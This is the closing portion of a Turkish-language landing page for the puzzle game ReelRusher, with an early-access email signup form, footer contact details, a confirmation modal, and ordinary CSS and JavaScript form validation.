                     <div class="testimonial-button-prev">
                        <i class="ti ti-arrow-narrow-left"></i>
                     </div>

                     <div class="testimonial-button-next">
                        <i class="ti ti-arrow-narrow-right"></i>
                     </div>
                  </div>
               </div>
            </div>

            <div class="col-12 col-md-6">
               <div class="testimonial-thumb ps-xl-5">
                  <img src="assets/30-BsTnk6-e.png" alt="">
               </div>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>


   <section class="cta-section bg-img jarallax">
      <img class="jarallax-img" src="assets/1-CMrVlQ4N.jpg" alt="">

      <div class="divider"></div>

      <div class="container">
         <div class="row">
            <div class="col-12 col-lg-8 col-xl-7">
               <h2 class="mb-4 text-white wow fadeInUp" data-wow-delay="400ms" data-wow-duration="1000ms">ReelRusher'a 
                  erken erişim ister misin?</h2>
               <p class="mb-5 text-white wow fadeInUp" data-wow-delay="600ms" data-wow-duration="1000ms">Oyunumuzun beta 
                  versiyonuna erken erişim için e-posta adresini bırak, ilk oynayanlar arasında ol!</p>
               <a href="#signup" class="btn btn-light wow fadeInUp" data-wow-delay="800ms" data-wow-duration="1000ms">
                  <span>Erken Erişim <i class="ti ti-arrow-up-right"></i></span>
                  <span>Erken Erişim <i class="ti ti-arrow-up-right"></i></span>
               </a>
            </div>
         </div>
      </div>

      <div class="divider"></div>
   </section>

   <section class="testimonial-section bg-secondary" id="signup">
      <div class="divider"></div>

      <div class="container">
         <div class="row justify-content-center">
            <div class="col-12 col-lg-8">
              
 
               <div class="book-consultation-card shadow wow fadeInUp" data-wow-delay="1000ms" data-wow-duration="1000ms">
                  <h5>Erken erişim kazanmak için e-posta adresini bırak!</h5>
                  <p class="mb-4">ReelRusher beta sürümüne ilk erişim hakkı kazan</p>

                  <form action="#" id="signup" novalidate>
                     <div class="row g-4">
                        <div class="col-12">
                           <div class="form-group">
                              <input type="text" class="form-control" placeholder="Adın" id="userName" name="userName" required minlength="2">
                              <div class="invalid-feedback">
                                 Lütfen geçerli bir ad girin (en az 2 karakter).
                              </div>
                           </div>
                        </div>
                        <div class="col-12">
                           <div class="form-group">
                              <input type="email" class="form-control" placeholder="E-posta adresi" id="userEmail" name="userEmail" required>
                              <div class="invalid-feedback">
                                 Lütfen geçerli bir e-posta adresi girin.
                              </div>
                           </div>
                        </div>
                       
                        <input type="hidden" name="gclid" id="gclidInput" value="">
                        <input type="hidden" name="gclid_timestamp" id="gclidTimestamp" value="">
                        
                        <div class="col-12">
                           <button type="submit" class="btn btn-primary w-100">
                              <span>Kayıt Ol</span>
                              <span>Kayıt Ol</span>
                           </button>
                        </div>
                     </div>
                  </form>
               </div>
            </div>
        
         </div>
      </div>

      <div class="divider"></div>
   </section>
   <footer class="footer-section" style="background-color: #174035;">
      <div class="divider"></div>

      <div class="container">
         <div class="row g-5">
            <div class="col-12 col-md-4">
               <div class="footer-card">
                  <a href="/" class="footer-logo mb-4">
                     <img src="assets/nav-brand-footer.png" alt="ReelRusher">
                  </a>
                  <p style="color: #E8F5E8;">ReelRusher - Match-3 ve Zuma mekaniklerini birleştiren, piramit şeklinde tahta ile benzersiz bir puzzle oyun deneyimi.</p>
                
               </div>
            </div>

            <div class="col-12 col-md">
               <div class="footer-card">
                  <h4 class="mb-4" style="color: #FFFFFF;">Oyun Hakkında</h4>
                  <ul class="list-unstyled footer-nav-two">
                     <li><a href="mechanics.html" style="color: #E8F5E8;">Oyun Mekanikleri</a></li>
                     <li><a href="game-art.html" style="color: #E8F5E8;">Oyun Sanatı ve Kapaklar</a></li>
                     <li><a href="team.html" style="color: #E8F5E8;">Geliştirici Ekibi</a></li>
                     <li><a href="technology.html" style="color: #E8F5E8;">Teknoloji ve Platformlar</a></li>
                     <li><a href="roadmap.html" style="color: #E8F5E8;">Geliştirme Yol Haritası</a></li>
                  </ul>
               </div>
            </div>

            <div class="col-12 col-md">
               <div class="footer-card">
                  <h4 class="mb-4" style="color: #FFFFFF;">Faydalı Bağlantılar</h4>
                  <ul class="list-unstyled footer-nav-two">
                     <li><a href="/" style="color: #E8F5E8;">Ana Sayfa</a></li>
                     <li><a href="about-us.html" style="color: #E8F5E8;">Hakkımızda</a></li>
                     <li><a href="contact.html" style="color: #E8F5E8;">İletişim</a></li>
                
                  </ul>
               </div>
            </div>

            <div class="col-12 col-md">
               <div class="footer-card">
                  <h4 class="mb-4" style="color: #FFFFFF;">İletişim</h4>
                  <ul class="list-unstyled footer-nav-two">
                     <li>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                           <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM19.6 8.25L12.53 12.67C12.21 12.87 11.79 12.87 11.47 12.67L4.4 8.25C4.29973 8.19371 4.21192 8.11766 4.14189 8.02645C4.07186 7.93525 4.02106 7.83078 3.99258 7.71937C3.96409 7.60796 3.9585 7.49194 3.97616 7.37831C3.99381 7.26468 4.03434 7.15581 4.09528 7.0583C4.15623 6.96079 4.23632 6.87666 4.33073 6.811C4.42513 6.74533 4.53187 6.69951 4.6445 6.6763C4.75712 6.65309 4.87328 6.65297 4.98595 6.67595C5.09863 6.69893 5.20546 6.74453 5.3 6.81L12 11L18.7 6.81C18.7945 6.74453 18.9014 6.69893 19.014 6.67595C19.1267 6.65297 19.2429 6.65309 19.3555 6.6763C19.4681 6.69951 19.5749 6.74533 19.6693 6.811C19.7637 6.87666 19.8438 6.96079 19.9047 7.0583C19.9657 7.15581 20.0062 7.26468 20.0238 7.37831C20.0415 7.49194 20.0359 7.60796 20.0074 7.71937C19.9789 7.83078 19.9281 7.93525 19.8581 8.02645C19.7881 8.11766 19.7003 8.19371 19.6 8.25Z" fill="#E8F5E8"></path>
                        </svg>
                        <a href="mailto:info@reelrusher.com" style="color: #E8F5E8;">info@reelrusher.com</a>
                     </li>
                     <li>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                           <path d="M8.125 2C7.56141 2 7.02091 2.22388 6.6224 2.6224C6.22388 3.02091 6 3.56141 6 4.125V19.875C6 20.4386 6.22388 20.9791 6.6224 21.3776C7.02091 21.7761 7.56141 22 8.125 22H15.875C16.4386 22 16.9791 21.7761 17.3776 21.3776C17.7761 20.9791 18 20.4386 18 19.875V4.125C18 3.56141 17.7761 3.02091 17.3776 2.6224C16.9791 2.22388 16.4386 2 15.875 2H8.125ZM10.625 17.75H13.375C13.5408 17.75 13.6997 17.8158 13.8169 17.9331C13.9342 18.0503 14 18.2092 14 18.375C14 18.5408 13.9342 18.6997 13.8169 18.8169C13.6997 18.9342 13.5408 19 13.375 19H10.625C10.4592 19 10.3003 18.9342 10.1831 18.8169C10.0658 18.6997 10 18.5408 10 18.375C10 18.2092 10.0658 18.0503 10.1831 17.9331C10.3003 17.8158 10.4592 17.75 10.625 17.75Z" fill="#E8F5E8"></path>
                        </svg>
                        <a href="tel:+905324176488" style="color: #E8F5E8;">+90 532 417 64 88</a>
                     </li>
                     <li>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                           <path d="M12 10.5C12.8284 10.5 13.5 9.82843 13.5 9C13.5 8.17157 12.8284 7.5 12 7.5C11.1716 7.5 10.5 8.17157 10.5 9C10.5 9.82843 11.1716 10.5 12 10.5Z" fill="#E8F5E8"></path>
                           <path d="M12 1.5C7.86469 1.5 4.5 4.71797 4.5 8.67188C4.5 10.5548 5.35828 13.0589 7.05094 16.1147C8.41031 18.5681 9.98297 20.7867 10.8009 21.8906C10.9392 22.0792 11.1199 22.2326 11.3284 22.3384C11.537 22.4441 11.7676 22.4992 12.0014 22.4992C12.2352 22.4992 12.4658 22.4441 12.6744 22.3384C12.8829 22.2326 13.0637 22.0792 13.2019 21.8906C14.0184 20.7867 15.5925 18.5681 16.9519 16.1147C18.6417 13.0598 19.5 10.5558 19.5 8.67188C19.5 4.71797 16.1353 1.5 12 1.5ZM12 12C11.4067 12 10.8266 11.8241 10.3333 11.4944C9.83994 11.1648 9.45542 10.6962 9.22836 10.1481C9.0013 9.59987 8.94189 8.99667 9.05764 8.41473C9.1734 7.83279 9.45912 7.29824 9.87868 6.87868C10.2982 6.45912 10.8328 6.1734 11.4147 6.05764C11.9967 5.94189 12.5999 6.0013 13.1481 6.22836C13.6962 6.45542 14.1648 6.83994 14.4944 7.33329C14.8241 7.82664 15 8.40666 15 9C14.9991 9.79538 14.6828 10.5579 14.1204 11.1204C13.5579 11.6828 12.7954 11.9991 12 12Z" fill="#E8F5E8"></path>
                        </svg>
                        <a href="https://maps.app.goo.gl/Y8658s8PMauVCkGe8" style="color: #E8F5E8;">Adagül Sk. No:18 D:4, İstanbul, Türkiye</a>
                     </li>
                  </ul>
               </div>
            </div>
         </div>
      </div>

      <div class="copyright-section style-two" style="background-color: #174035;">
         <div class="container">
            <div class="d-flex flex-wrap justify-content-center align-items-center justify-content-md-between gap-3 gap-lg-4">
               <p class="mb-0 copyright justify-content-center justify-content-md-end" style="color: #E8F5E8;"><span id="year">2025</span> © 
                  <a href="#" style="color: #FFFFFF;">ReelRusher</a>
                  Tüm hakları saklıdır.</p>

               <ul class="copyright-nav style-two justify-content-center list-unstyled d-flex flex-wrap gap-3 gap-lg-4">
                  <li><a href="privacy-policy.html" style="color: #E8F5E8;">Gizlilik ve Çerez Politikası</a></li>
                  <li><a href="terms-of-use.html" style="color: #E8F5E8;">Kullanım Koşulları</a></li>
               </ul>
            </div>
         </div>
      </div>
   </footer>
   <div id="successModal" class="modal-overlay" style="display: none;">
      <div class="modal-content">
         <div class="modal-header">
            <h4 class="text-success">
               <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22,4 12,14.01 9,11.01"></polyline>
               </svg>
               Başarılı!
            </h4>
            <button type="button" class="close-modal" aria-label="Kapat">
               <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"></line>
                  <line x1="6" y1="6" x2="18" y2="18"></line>
               </svg>
            </button>
         </div>
         <div class="modal-body">
            <p>🎉 Harika! <strong id="registeredName"></strong>, ReelRusher erken erişim listesine başarıyla kaydoldun!</p>
            <p>Beta sürümü hazır olduğunda <strong id="registeredEmail"></strong> adresine bilgi vereceğiz.</p>
            <p style="margin-top: 15px; font-size: 14px; color: #666;">
               📧 E-posta kutunu kontrol etmeyi unutma!
            </p>
         </div>
         <div class="modal-footer">
            <button type="button" class="btn btn-primary close-modal">Tamam</button>
         </div>
      </div>
   </div>

   <style>
   .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: fadeIn 0.3s ease-out;
   }

   .modal-content {
      background: white;
      border-radius: 12px;
      max-width: 500px;
      width: 90%;
      margin: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
      animation: slideUp 0.3s ease-out;
   }

   .modal-header {
      padding: 20px 24px 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #eee;
      padding-bottom: 15px;
   }

   .modal-header h4 {
      margin: 0;
      color: #174035;
      display: flex;
      align-items: center;
   }

   .close-modal {
      background: none;
      border: none;
      cursor: pointer;
      padding: 8px;
      border-radius: 50%;
      transition: background-color 0.2s;
   }

   .close-modal:hover {
      background-color: #f1f1f1;
   }

   .modal-body {
      padding: 20px 24px;
   }

   .modal-body p {
      margin-bottom: 10px;
      line-height: 1.5;
   }

   .modal-footer {
      padding: 0 24px 20px;
      text-align: right;
   }

   .invalid-feedback {
      display: none;
      font-size: 14px;
      color: #dc3545;
      margin-top: 5px;
   }

   .form-control.is-invalid {
      border-color: #dc3545;
   }

   .form-control.is-invalid ~ .invalid-feedback {
      display: block;
   }

   .form-control.is-valid {
      border-color: #28a745;
   }

   @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
   }

   @keyframes slideUp {
      from { 
         opacity: 0;
         transform: translateY(30px);
      }
      to { 
         opacity: 1;
         transform: translateY(0);
      }
   }

   .service-card-two .icon i {
      font-size: 3.5rem !important;
      color: #174035;
      line-height: 1;
   }

   .service-card-two .icon {
      margin-bottom: 1.5rem;
   }
   </style>

   <script>
   document.addEventListener('DOMContentLoaded', function() {
      const newsletterForm = document.getElementById('newsletterForm');
      const newsletterEmailInput = document.getElementById('emailInput');
      const successModal = document.getElementById('successModal');
      
      if (newsletterForm && newsletterEmailInput) {
         newsletterForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = newsletterEmailInput.value.trim();
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            
            if (!email) {
               alert('Lütfen e-posta adresinizi girin.');
               newsletterEmailInput.focus();
               return;
            }
            
            if (!emailRegex.test(email)) {
               alert('Lütfen geçerli bir e-posta adresi girin.');
               newsletterEmailInput.focus();
               return;
            }
            
          
            const registeredNameElement = document.getElementById('registeredName');
            const registeredEmailElement = document.getElementById('registeredEmail');
            
            if (registeredEmailElement) {
               registeredEmailElement.textContent = email;
            }
            
            if (registeredNameElement) {
               registeredNameElement.textContent = 'ReelRusher Oyuncusu'; 
            }
            
            newsletterEmailInput.value = '';
            
            if (window.bootstrap && window.bootstrap.Modal && successModal) {
               const modal = new window.bootstrap.Modal(successModal);
               modal.show();
            } else if (successModal) {
               successModal.style.display = 'flex';
               successModal.style.alignItems = 'center';
               successModal.style.justifyContent = 'center';
               successModal.style.position = 'fixed';
               successModal.style.top = '0';
               successModal.style.left = '0';
               successModal.style.width = '100%';
               successModal.style.height = '100%';
               successModal.style.backgroundColor = 'rgba(0,0,0,0.5)';
               successModal.style.zIndex = '9999';
               
               successModal.addEventListener('click', function(e) {
                  if (e.target === successModal) {
                     successModal.style.display = 'none';
                  }
               });

               const closeButtons = successModal.querySelectorAll('.close-modal');
               closeButtons.forEach(button => {
                  button.addEventListener('click', function() {
                     successModal.style.display = 'none';
                  });
               });
            } else {
               alert('Başarıyla kaydoldunuz! ReelRusher\'dan güncellemeleri ilk siz öğreneceksiniz.');
            }
         });
      }

      const form = document.querySelector('form#signup');
      const nameInput = document.getElementById('userName');
      const emailInput = document.getElementById('userEmail');
      const modal = document.getElementById('successModal');
      const closeBtns = document.querySelectorAll('.close-modal');

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (nameInput) {
         nameInput.addEventListener('input', function() {
            validateName(this);
         });
      }

      if (emailInput) {
         emailInput.addEventListener('input', function() {
            validateEmail(this);
         });
      }

      if (form && nameInput && emailInput) {
         form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const isNameValid = validateName(nameInput);
            const isEmailValid = validateEmail(emailInput);

            if (isNameValid && isEmailValid) {
               const formData = {
                  name: nameInput.value.trim(),
                  email: emailInput.value.trim(),
                  formType: 'signup'
               };
               
               if (window.GclidTracker) {
                  const gclidData = window.GclidTracker.getFormData();
                  Object.assign(formData, gclidData);
                  
                  const gclidInput = document.getElementById('gclidInput');
                  const gclidTimestamp = document.getElementById('gclidTimestamp');
                  if (gclidInput && gclidData.gclid) {
                     gclidInput.value = gclidData.gclid;
                  }
                  if (gclidTimestamp && gclidData.gclid_timestamp) {
                     gclidTimestamp.value = gclidData.gclid_timestamp;
                  }
               }
               
               document.getElementById('registeredName').textContent = nameInput.value.trim();
               document.getElementById('registeredEmail').textContent = emailInput.value.trim();
               showModal();
               
               if (typeof form.reset === 'function') {
                  form.reset();
               } else {
                  nameInput.value = '';
                  emailInput.value = '';
               }
               clearValidation();
            }
         });
      }

      if (closeBtns.length > 0) {
         closeBtns.forEach(btn => {
            btn.addEventListener('click', hideModal);
         });
      }

      if (modal) {
         modal.addEventListener('click', function(e) {
            if (e.target === modal) {
               hideModal();
            }
         });
      }

      document.addEventListener('keydown', function(e) {
         if (e.key === 'Escape' && modal && modal.style.display !== 'none') {
            hideModal();
         }
      });

      function validateName(input) {
         const value = input.value.trim();
         const isValid = value.length >= 2;
         
         if (isValid) {
            input.classList.remove('is-invalid');
            input.classList.add('is-valid');
         } else {
            input.classList.remove('is-valid');
            input.classList.add('is-invalid');
         }
         
         return isValid;
      }

      function validateEmail(input) {
         const value = input.value.trim();
         const isValid = emailRegex.test(value);
         
         if (isValid) {
            input.classList.remove('is-invalid');
            input.classList.add('is-valid');
         } else {
            input.classList.remove('is-valid');
            input.classList.add('is-invalid');
         }
         
         return isValid;
      }

      function clearValidation() {
         if (nameInput && emailInput) {
            [nameInput, emailInput].forEach(input => {
               input.classList.remove('is-valid', 'is-invalid');
            });
         }
      }

      function showModal() {
         if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
         }
      }

      function hideModal() {
         if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = '';
         }
      }
   });
   </script>
   <div class="cookiealert shadow-lg">
      <h4 class="text-white"><i class="ti ti-cookie"></i> Çerez Uyarısı</h4>
      <p class="mb-4 text-white">Web sitemizde en iyi deneyimi yaşamanız için çerezleri kullanıyoruz. Devam ederek çerez kullanımını kabul etmiş olursunuz. <a href="privacy-policy.html" target="_blank">Çerez Politikası</a> için tıklayın.</p>
      <button class="btn btn-dark btn-sm acceptcookies" type="button" aria-label="Close">Kabul Et</button>
   </div>

   <button id="scrollTopButton" class="fandi-scrolltop scrolltop-hide">
      <i class="ti ti-arrow-up"></i>
   </button>

</body>

</html>
  